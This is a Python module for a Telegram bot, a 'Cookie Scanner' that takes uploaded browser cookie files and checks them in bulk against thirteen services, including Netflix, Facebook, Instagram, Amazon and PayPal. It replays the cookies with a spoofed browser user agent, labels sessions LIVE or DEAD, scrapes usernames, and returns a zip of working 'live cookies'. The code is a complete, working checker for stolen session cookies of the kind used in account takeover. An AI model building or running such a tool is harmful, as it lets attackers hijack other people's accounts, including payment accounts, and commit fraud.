# ============================================================
# COOKIE SCANNER — Multi-Service Bulk Scanner
# ============================================================

import re
import zipfile
import requests
from io import BytesIO
from datetime import datetime

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from telegram.ext import ContextTypes, ConversationHandler

from config import E
from utils import pe, update_bot_stats


WAITING_SCAN_FILE = 12
SCAN_EMOJI = "6012792650615230712"
SCAN_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0"


SCAN_TARGETS = {
    "netflix":   {"domains": ["netflix.com"],   "url": "https://www.netflix.com/browse"},
    "spotify":   {"domains": ["spotify.com"],   "url": "https://www.spotify.com/account/overview/"},
    "facebook":  {"domains": ["facebook.com"],  "url": "https://www.facebook.com/settings"},
    "instagram": {"domains": ["instagram.com"], "url": "https://www.instagram.com/accounts/edit/"},
    "tiktok":    {"domains": ["tiktok.com"],    "url": "https://www.tiktok.com/setting"},
    "youtube":   {"domains": ["youtube.com"],   "url": "https://www.youtube.com/account"},
    "linkedin":  {"domains": ["linkedin.com"],  "url": "https://www.linkedin.com/mypreferences/d/categories/account"},
    "amazon":    {"domains": ["amazon.com"],    "url": "https://www.amazon.com/gp/your-account/order-history"},
    "roblox":    {"domains": ["roblox.com"],    "url": "https://www.roblox.com/home"},
    "canva":     {"domains": ["canva.com"],     "url": "https://www.canva.com/settings/"},
    "wordpress": {"domains": ["wordpress.com"], "url": "https://wordpress.com/me/"},
    "capcut":    {"domains": ["capcut.com"],    "url": "https://www.capcut.com/my-edit"},
    "paypal":    {"domains": ["paypal.com"],    "url": "https://www.paypal.com/myaccount/profile/"},
}


def scan_parse_netscape(content):
    cookies = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) < 7:
            continue
        cookies.append({
            'domain': parts[0],
            'path': parts[2],
            'secure': parts[3].upper() == 'TRUE',
            'expires': parts[4],
            'name': parts[5],
            'value': parts[6],
        })
    return cookies


def scan_filter_by_service(cookies, service):
    target_domains = SCAN_TARGETS[service]["domains"]
    return [c for c in cookies if any(td in c['domain'] for td in target_domains)]


def scan_test_service(cookies, service):
    if not cookies:
        return {"status": "NONE"}
    target = SCAN_TARGETS[service]
    url = target["url"]
    try:
        session = requests.Session()
        for c in cookies:
            domain = c['domain'].lstrip('.')
            session.cookies.set(
                c['name'],
                str(c['value'])[:4000],
                domain=domain,
                path=c['path'],
                secure=c['secure'],
            )
        headers = {
            "User-Agent": SCAN_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
        }
        response = session.get(url, headers=headers, timeout=20, allow_redirects=True)
        final_url = response.url
        status_code = response.status_code
        if any(x in final_url.lower() for x in ['/login', '/signin', '/sign-in', '/accounts/login', '/ap/signin']):
            return {"status": "DEAD", "message": "Redirected to login", "final_url": final_url}
        if status_code == 200:
            username = None
            for pattern in [r'"username":"([^"]+)"', r'"uniqueId":"([^"]+)"', r'"display_name":"([^"]+)"']:
                m = re.search(pattern, response.text)
                if m:
                    username = m.group(1)
                    break
            return {
                "status": "LIVE",
                "final_url": final_url,
                "status_code": status_code,
                "username": username,
            }
        return {"status": "UNKNOWN", "message": f"HTTP {status_code}", "final_url": final_url}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:80]}


def scan_cancel_button():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton(
            f"{pe(E['cross'])} Cancel",
            callback_data="main_menu",
            icon_custom_emoji_id=E['cross']
        )
    ]])


def scan_back_button():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton(
            f"{pe(E['prev'])} Back",
            callback_data="main_menu",
            icon_custom_emoji_id=E['prev']
        )
    ]])


def scan_fmt_result(r):
    lines = [
        f"╔═══════════════════════════╗",
        f"║  {pe(SCAN_EMOJI)} <b>SCAN RESULTS</b>         ║",
        f"╚═══════════════════════════╝",
        "",
    ]
    service_emojis = {
        "netflix": "🎬", "spotify": "🎵", "facebook": "📘",
        "instagram": "📸", "tiktok": "🎵", "youtube": "📺",
        "linkedin": "💼", "amazon": "🛒", "roblox": "🎮",
        "canva": "🎨", "wordpress": "🌐", "capcut": "✂️",
        "paypal": "💳",
    }
    for service, result in r.get('results', {}).items():
        icon = service_emojis.get(service, "❓")
        status = result.get('status', 'UNKNOWN')
        if status == "LIVE":
            status_str = f"{pe(E['check'])} <b>LIVE</b>"
        elif status == "DEAD":
            status_str = f"{pe(E['cross'])} <b>DEAD</b>"
        else:
            status_str = f"{pe(E['warn'])} <b>{status}</b>"
        username = result.get('username')
        user_str = f" <code>{username}</code>" if username else ""
        lines.append(f"{icon} <b>{service.title()}</b> — {status_str}{user_str}")
    lines.append("")
    lines.append(f"{pe(E['dice'])} Live: <b>{r.get('live', 0)}</b> | Dead: <b>{r.get('dead', 0)}</b>")
    return "\n".join(lines)


def scan_fmt_progress(done, total, live, dead):
    pct = done / total if total else 0
    filled = int(pct * 10)
    bar = "█" * filled + "░" * (10 - filled)
    return (
        f"{pe(SCAN_EMOJI)} <b>Cookie Scanner</b> — Running\n\n"
        f"<code>[{bar}]  {int(pct * 100)}%</code>\n\n"
        f"{pe(E['check'])} Live    : <b>{live}</b>\n"
        f"{pe(E['cross'])} Dead    : <b>{dead}</b>\n"
        f"{pe(E['star'])} Checked : <b>{done}</b> / <b>{total}</b>"
    )


async def scan_start_handler(update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"{pe(SCAN_EMOJI)} <b>Cookie Scanner</b>\n\n"
        f"{pe(E['next'])} Upload a <b>.txt</b> file with Netscape cookies\n"
        f"{pe(E['bolt'])} Detects and tests <b>13 services</b>:\n"
        f"Netflix • Spotify • Facebook • Instagram • TikTok\n"
        f"YouTube • LinkedIn • Amazon • Roblox • Canva\n"
        f"WordPress • CapCut • PayPal\n\n"
        f"{pe(E['star'])} Extracts all live accounts per service.",
        reply_markup=scan_cancel_button(),
        parse_mode="HTML"
    )
    return WAITING_SCAN_FILE


async def scan_handle_file(update, context):
    document = update.message.document
    if not document:
        await update.message.reply_html(
            f"{pe(E['cross'])} Please upload a file.",
            reply_markup=scan_cancel_button()
        )
        return WAITING_SCAN_FILE

    status_msg = await update.message.reply_html(
        f"{pe(E['loading'])} Processing file..."
    )

    try:
        file = await document.get_file()
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        cookies = scan_parse_netscape(text)
        if not cookies:
            await status_msg.edit_text(
                f"{pe(E['cross'])} No cookies found in file.",
                reply_markup=scan_back_button()
            )
            return ConversationHandler.END

        results = {}
        total_services = len(SCAN_TARGETS)
        done = 0

        for service in SCAN_TARGETS.keys():
            filtered = scan_filter_by_service(cookies, service)
            if filtered:
                r = scan_test_service(filtered, service)
                r['cookie_count'] = len(filtered)
                r['cookies'] = filtered
                results[service] = r
            done += 1
            if done % 3 == 0 or done == total_services:
                try:
                    await status_msg.edit_text(
                        scan_fmt_progress(
                            done,
                            total_services,
                            sum(1 for x in results.values() if x.get('status') == 'LIVE'),
                            sum(1 for x in results.values() if x.get('status') == 'DEAD'),
                        ),
                        reply_markup=scan_back_button()
                    )
                except Exception:
                    pass

        live = sum(1 for x in results.values() if x.get('status') == 'LIVE')
        dead = sum(1 for x in results.values() if x.get('status') == 'DEAD')

        final_result = {
            "filename": document.file_name or 'file',
            "results": results,
            "live": live,
            "dead": dead,
            "total": len(results),
        }

        if live > 0:
            buf = BytesIO()
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                for service, r in results.items():
                    if r.get('status') == 'LIVE':
                        lines = [f"# LIVE cookies for {service}"]
                        for c in r.get('cookies', []):
                            lines.append(
                                f"{c['domain']}\tTRUE\t{c['path']}\t"
                                f"{'TRUE' if c['secure'] else 'FALSE'}\t"
                                f"{c['expires']}\t{c['name']}\t{c['value']}"
                            )
                        zf.writestr(f"{service}_live.txt", "\n".join(lines))
            buf.seek(0)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            await update.message.reply_document(
                InputFile(buf, filename=f"live_cookies_{ts}.zip"),
                caption=f"{pe(SCAN_EMOJI)} {live} live services extracted!"
            )

        await status_msg.edit_text(
            scan_fmt_result(final_result),
            reply_markup=scan_back_button()
        )
        update_bot_stats(live > 0)

    except Exception as e:
        await status_msg.edit_text(
            f"{pe(E['cross'])} Error: {str(e)[:200]}",
            reply_markup=scan_back_button()
        )
        update_bot_stats(False)

    return ConversationHandler.END